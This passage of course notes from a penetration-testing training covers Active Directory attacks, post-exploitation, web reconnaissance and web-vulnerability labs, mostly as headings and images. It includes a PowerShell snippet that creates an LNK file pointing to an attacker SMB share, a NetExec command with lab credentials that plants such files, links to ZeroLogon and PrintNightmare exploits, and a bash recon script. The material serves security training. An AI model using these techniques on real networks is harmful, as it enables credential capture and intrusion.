![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2024.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2025.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2026.png)

### SMB Relay Attacks Lab

### SMB Relay Attack Defenses

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2027.png)

### Gaining Shell Access

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2028.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2029.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2030.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2031.png)

### IPv6 Attacks Overview

### IPv6 DNS Takeover via mitm6

### IPv6 Attack Defenses

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2032.png)

### Passback Attacks

A Pen Tester’s Guide to Printer Hacking - [https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)

### Initial Internal Attack Strategy

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2033.png)

## Attacking Active Directory: Post-Compromise Enumeration

### Introduction

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2034.png)

### Domain Enumeration with ldapdomaindump

### Domain Enumeration with Bloodhound

### Domain Enumeration with Plumhound

### Domain Enumeration with PingCastle

## Attacking Active Directory: Post-Compromise Attacks

### Introduction

### Pass Attacks Overview

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2035.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2036.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2037.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2038.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2039.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2040.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2041.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2042.png)

### Pass Attacks

### Dumping and Cracking Hashes

### Pass Attack Mitigations

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2043.png)

### Kerberoasting Overview

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2044.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2045.png)

### Kerberoasting Walkthrough

### Kerberoasting Mitigation

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2046.png)

### Token Impersonation Overview

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2047.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2048.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2049.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2050.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2051.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2052.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2053.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2054.png)

### Token Impersonation Walkthrough

### Token Impersonation Mitigation

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2055.png)

### LNK File Attacks

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2056.png)

TEXT

```
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.138.149\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

Additional resources for forced authentication: [https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf)

Automated attack using CME/NetExec:

netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2057.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2058.png)

### GPP / cPassword Attacks and Mitigations

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2059.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2060.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2061.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2062.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2063.png)

### Mimikatz Overview

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2064.png)

### Credential Dumping with Mimikatz

### Post-Compromise Attack Strategy

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2065.png)

## We've Compromised the Domain - Now What?

### Post-Domain Compromise Attack Strategy

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2066.png)

### Dumping the NTDS.dit

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2067.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2068.png)

### Golden Ticket Attacks Overview

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2069.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2070.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2071.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2072.png)

psexact.exe

### Golden Ticket Attacks

## Additional Active Directory Attacks

### Section Overview

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2073.png)

### Abusing ZeroLogon

What is ZeroLogon? - [https://www.trendmicro.com/en_us/what-is/zerologon.html](https://www.trendmicro.com/en_us/what-is/zerologon.html)

dirkjanm CVE-2020-1472 - [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

SecuraBV ZeroLogon Checker - [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)

### PrintNightmare (CVE-2021-1675) Walkthrough

cube0x0 RCE - [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)

calebstewart LPE - [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)

## Active Directory Case Study

[https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security/](https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security)

[https://tcm-sec.com/pentest-tales-002-digging-deep](https://tcm-sec.com/pentest-tales-002-digging-deep)

## Post Exploitation

### Introduction

### File Transfers Review

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2074.png)

### Maintaining Access Overview

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2075.png)

### Pivoting Overview

### Pivoting Walkthrough

sshutle

proxychains

Chisel

### Cleaning Up

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2076.png)

## Web Application Enumeration, Revisited

### Introduction

### Installing Go

### Finding Subdomains with Assetfinder

### Finding Subdomains with Amass

### Finding Alive Domains with Httprobe

### Screenshotting Websites with GoWitness

GoWitness - [https://github.com/sensepost/gowitness](https://github.com/sensepost/gowitness)

### Automating the Enumeration Process + Enumeration script

sumrecon: [https://github.com/thatonetester/sumrecon](https://github.com/thatonetester/sumrecon)

TCM's modified script - [https://pastebin.com/MhE6zXVt](https://pastebin.com/MhE6zXVt)

```bash
#!/bin/bash	
url=$1
if [ ! -d "$url" ];then
	mkdir $url
fi
if [ ! -d "$url/recon" ];then
	mkdir $url/recon
fi
#    if [ ! -d '$url/recon/eyewitness' ];then
#        mkdir $url/recon/eyewitness
#    fi
if [ ! -d "$url/recon/scans" ];then
	mkdir $url/recon/scans
fi
if [ ! -d "$url/recon/httprobe" ];then
	mkdir $url/recon/httprobe
fi
if [ ! -d "$url/recon/potential_takeovers" ];then
	mkdir $url/recon/potential_takeovers
fi
if [ ! -d "$url/recon/wayback" ];then
	mkdir $url/recon/wayback
fi
if [ ! -d "$url/recon/wayback/params" ];then
	mkdir $url/recon/wayback/params
fi
if [ ! -d "$url/recon/wayback/extensions" ];then
	mkdir $url/recon/wayback/extensions
fi
if [ ! -f "$url/recon/httprobe/alive.txt" ];then
	touch $url/recon/httprobe/alive.txt
fi
if [ ! -f "$url/recon/final.txt" ];then
	touch $url/recon/final.txt
fi
 
echo "[+] Harvesting subdomains with assetfinder..."
assetfinder $url >> $url/recon/assets.txt
cat $url/recon/assets.txt | grep $1 >> $url/recon/final.txt
rm $url/recon/assets.txt
 
#echo "[+] Double checking for subdomains with amass..."
#amass enum -d $url >> $url/recon/f.txt
#sort -u $url/recon/f.txt >> $url/recon/final.txt
#rm $url/recon/f.txt
 
echo "[+] Probing for alive domains..."
cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> $url/recon/httprobe/a.txt
sort -u $url/recon/httprobe/a.txt > $url/recon/httprobe/alive.txt
rm $url/recon/httprobe/a.txt
 
echo "[+] Checking for possible subdomain takeover..."
 
if [ ! -f "$url/recon/potential_takeovers/potential_takeovers.txt" ];then
	touch $url/recon/potential_takeovers/potential_takeovers.txt
fi
 
subjack -w $url/recon/final.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 -o $url/recon/potential_takeovers/potential_takeovers.txt
 
echo "[+] Scanning for open ports..."
nmap -iL $url/recon/httprobe/alive.txt -T4 -oA $url/recon/scans/scanned.txt
 
echo "[+] Scraping wayback data..."
cat $url/recon/final.txt | waybackurls >> $url/recon/wayback/wayback_output.txt
sort -u $url/recon/wayback/wayback_output.txt
 
echo "[+] Pulling and compiling all possible params found in wayback data..."
cat $url/recon/wayback/wayback_output.txt | grep '?*=' | cut -d '=' -f 1 | sort -u >> $url/recon/wayback/params/wayback_params.txt
for line in $(cat $url/recon/wayback/params/wayback_params.txt);do echo $line'=';done
 
echo "[+] Pulling and compiling js/php/aspx/jsp/json files from wayback output..."
for line in $(cat $url/recon/wayback/wayback_output.txt);do
	ext="${line##*.}"
	if [[ "$ext" == "js" ]]; then
		echo $line >> $url/recon/wayback/extensions/js1.txt
		sort -u $url/recon/wayback/extensions/js1.txt >> $url/recon/wayback/extensions/js.txt
	fi
	if [[ "$ext" == "html" ]];then
		echo $line >> $url/recon/wayback/extensions/jsp1.txt
		sort -u $url/recon/wayback/extensions/jsp1.txt >> $url/recon/wayback/extensions/jsp.txt
	fi
	if [[ "$ext" == "json" ]];then
		echo $line >> $url/recon/wayback/extensions/json1.txt
		sort -u $url/recon/wayback/extensions/json1.txt >> $url/recon/wayback/extensions/json.txt
	fi
	if [[ "$ext" == "php" ]];then
		echo $line >> $url/recon/wayback/extensions/php1.txt
		sort -u $url/recon/wayback/extensions/php1.txt >> $url/recon/wayback/extensions/php.txt
	fi
	if [[ "$ext" == "aspx" ]];then
		echo $line >> $url/recon/wayback/extensions/aspx1.txt
		sort -u $url/recon/wayback/extensions/aspx1.txt >> $url/recon/wayback/extensions/aspx.txt
	fi
done
 
rm $url/recon/wayback/extensions/js1.txt
rm $url/recon/wayback/extensions/jsp1.txt
rm $url/recon/wayback/extensions/json1.txt
rm $url/recon/wayback/extensions/php1.txt
rm $url/recon/wayback/extensions/aspx1.txt
#echo "[+] Running eyewitness against all compiled domains..."
#python3 EyeWitness/EyeWitness.py --web -f $url/recon/httprobe/alive.txt -d $url/recon/eyewitness --resolve
```

```bash
Modified 

#!/bin/bash	
url=$1
if [ "$1" == "" ]
then
echo "Its Empty!"
echo "Syntax: ./autorecon.sh URL"
else
if [ ! -d "$url" ];then
	mkdir $url
fi
if [ ! -d "$url/recon" ];then
	mkdir $url/recon
fi
#    if [ ! -d '$url/recon/eyewitness' ];then
#        mkdir $url/recon/eyewitness
#    fi
if [ ! -d "$url/recon/scans" ];then
	mkdir $url/recon/scans
fi
if [ ! -d "$url/recon/httprobe" ];then
	mkdir $url/recon/httprobe
fi
if [ ! -d "$url/recon/potential_takeovers" ];then
	mkdir $url/recon/potential_takeovers
fi
if [ ! -d "$url/recon/wayback" ];then
	mkdir $url/recon/wayback
fi
if [ ! -d "$url/recon/wayback/params" ];then
	mkdir $url/recon/wayback/params
fi
if [ ! -d "$url/recon/wayback/extensions" ];then
	mkdir $url/recon/wayback/extensions
fi
if [ ! -f "$url/recon/httprobe/alive.txt" ];then
	touch $url/recon/httprobe/alive.txt
fi
if [ ! -f "$url/recon/final.txt" ];then
	touch $url/recon/final.txt
fi

echo "[+] Harvesting subdomains with assetfinder..."
assetfinder $url >> $url/recon/assets.txt
cat $url/recon/assets.txt | grep $1 >> $url/recon/final.txt
#rm $url/recon/assets.txt

#echo "[+] Double checking for subdomains with amass..."
#amass enum -d $url >> $url/recon/f.txt
#sort -u $url/recon/f.txt >> $url/recon/final.txt
#rm $url/recon/f.txt

echo "[+] Probing for alive domains..."
cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> $url/recon/httprobe/a.txt
sort -u $url/recon/httprobe/a.txt > $url/recon/httprobe/alive.txt
#rm $url/recon/httprobe/a.txt

echo "[+] Checking for possible subdomain takeover..."

if [ ! -f "$url/recon/potential_takeovers/potential_takeovers.txt" ];then
	touch $url/recon/potential_takeovers/potential_takeovers.txt
fi

subjack -w $url/recon/final.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 -o $url/recon/potential_takeovers/potential_takeovers.txt

echo "[+] Scanning for open ports..."
nmap -iL $url/recon/httprobe/alive.txt -T4 -oA $url/recon/scans/scanned.txt

echo "[+] Scraping wayback data..."
cat $url/recon/final.txt | waybackurls >> $url/recon/wayback/wayback_output.txt
sort -u $url/recon/wayback/wayback_output.txt

echo "[+] Pulling and compiling all possible params found in wayback data..."
cat $url/recon/wayback/wayback_output.txt | grep '?*=' | cut -d '=' -f 1 | sort -u >> $url/recon/wayback/params/wayback_params.txt
for line in $(cat $url/recon/wayback/params/wayback_params.txt);do echo $line'=';done

echo "[+] Pulling and compiling js/php/aspx/jsp/json files from wayback output..."
for line in $(cat $url/recon/wayback/wayback_output.txt);do
	ext="${line##*.}"
	if [[ "$ext" == "js" ]]; then
		echo $line >> $url/recon/wayback/extensions/js1.txt
		sort -u $url/recon/wayback/extensions/js1.txt >> $url/recon/wayback/extensions/js.txt
	fi
	if [[ "$ext" == "html" ]];then
		echo $line >> $url/recon/wayback/extensions/jsp1.txt
		sort -u $url/recon/wayback/extensions/jsp1.txt >> $url/recon/wayback/extensions/jsp.txt
	fi
	if [[ "$ext" == "json" ]];then
		echo $line >> $url/recon/wayback/extensions/json1.txt
		sort -u $url/recon/wayback/extensions/json1.txt >> $url/recon/wayback/extensions/json.txt
	fi
	if [[ "$ext" == "php" ]];then
		echo $line >> $url/recon/wayback/extensions/php1.txt
		sort -u $url/recon/wayback/extensions/php1.txt >> $url/recon/wayback/extensions/php.txt
	fi
	if [[ "$ext" == "aspx" ]];then
		echo $line >> $url/recon/wayback/extensions/aspx1.txt
		sort -u $url/recon/wayback/extensions/aspx1.txt >> $url/recon/wayback/extensions/aspx.txt
	fi
done

#rm $url/recon/wayback/extensions/js1.txt
#rm $url/recon/wayback/extensions/jsp1.txt
#rm $url/recon/wayback/extensions/json1.txt
#rm $url/recon/wayback/extensions/php1.txt
#rm $url/recon/wayback/extensions/aspx1.txt
#echo "[+] Running eyewitness against all compiled domains..."
#python3 EyeWitness/EyeWitness.py --web -f $url/recon/httprobe/alive.txt -d $url/recon/eyewitness --resolve
fi

```

### Additional Resources

The Bug Hunter's Methodology - [https://www.youtube.com/watch?v=uKWu6yhnhbQ](https://www.youtube.com/watch?v=uKWu6yhnhbQ)

Nahamsec Recon Playlist - [https://www.youtube.com/watch?v=MIujSpuDtFY&list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA](https://www.youtube.com/watch?v=MIujSpuDtFY&list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA)

## Find & Exploit Common Web Vulnerabilities

[https://appsecexplained.gitbook.io/appsecexplained/](https://appsecexplained.gitbook.io/appsecexplained/fundamentals/web-applications/web-application-architecture)

[https://github.com/OWASP](https://github.com/OWASP)

### Introduction

### Lab Setup

**Download**

[**peh-web-labs.tar.gz**](https://cdn.fs.teachablecdn.com/CbIyLkOuS4GUH7TNFTFg)

### **Lab setup:**

`sudo apt update`

`sudo apt upgrade`

`sudo apt install docker.io`

`sudo apt install docker-compose`

**RESTART YOUR VM**

Copy the labs to a directory in your system, then open a terminal to that directory

`tar -xf peh-web-labs.tar.gz`

`cd labs`

`sudo docker-compose up`

(Keep reading! There is one more thing to do after the lab is built!)

The first time it runs, it will need to download some things, it may take a while depending on your connection. Next time you run it though, it will be much faster.

Once you see the databses are 'ready for connections' the containers should be ready to go.

[](https://cdn.fs.teachablecdn.com/ADNupMnWyR7kCWRvm76Laz/https://cdn.filestackcontent.com/rnRf7tsRG2F9tOIVpKEL)

The final step is to set some permissions for the webserver, this is needed for the file upload labs and the capstone challenge.

`./set-permissions.sh`

Browse to `http://localhost`

The first time you load the lab the database will need to be initialized, just follow the instructions in the red box by clicking the link, then coming back to the homepage.

Enjoy your labs!

### SQL Injection - Introduction

### SQL Injection - UNION

### SQL Injection - Blind Part 1

### SQL Injection - Blind Part 2

### SQL Injection - Challenge Waklthrough

### XSS - Introduction

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2077.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2078.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2079.png)

### XSS - DOM Lab

### XSS - Stored Lab

### XSS - Challenge Walkthrough

### Command Injection - Introduction

### Command Injection - Basics

### Command Injection - Blind / Out-of-Band

### Command Injection - Challenge Walkthrough

### Insecure File Upload - Introduction

### Insecure File Upload - Basic Bypass

### Insecure File Upload - Magic Bytes

### Insecure File Upload - Challenge Walkthrough

### Attacking Authentication - Intro

### Attacking Authentication - Brute Force

### Attacking Authentication - MFA

### Attacking Authentication - Challenge Walkthrough

### XXE - External Entities Injection

### IDOR - Insecure Direct Object Reference

### Capstone - Introduction

### Capstone - Solution

## Wireless Penetration Testing

### 001_Wireless_Penetration_Testing_Overview

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2080.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2081.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2082.png)

### 002_WPA_PS2_Exploit_Walkthrough

## Legal Documents and Report Writing

### 001_Common_Legal_Documents

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2083.png)

### 002_Pentest_Report_Writing

Sample Pentest Report: [https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report](https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report)

### 003_Reviewing_a_Real_Pentest_Report

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2084.png)
